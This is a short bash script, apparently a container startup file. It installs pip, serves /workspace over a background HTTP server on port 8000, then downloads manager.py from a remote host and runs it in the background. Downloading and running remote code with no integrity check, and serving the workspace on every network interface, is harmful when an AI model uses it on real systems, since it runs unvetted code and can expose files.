#!/usr/bin/env bash
set -euo pipefail

# 1) Install python3-pip if not already present
apt-get update && apt-get install -y python3-pip

# 2) Workspace setup
mkdir -p /workspace
cd /workspace

# 3) Launch HTTP server in the background
nohup python3 -m http.server 8000 > http.log 2>&1 &

# 4) Fetch manager.py and launch it
python3 - <<'PYCODE'
import urllib.request
urllib.request.urlretrieve(
    'https://admin.pyqapp.com/api/manager.py',
    '/workspace/manager.py'
)
PYCODE

nohup python3 /workspace/manager.py > /workspace/output.log 2>&1 &

# 5) Keep container alive by following the logs
tail -f /workspace/output.log
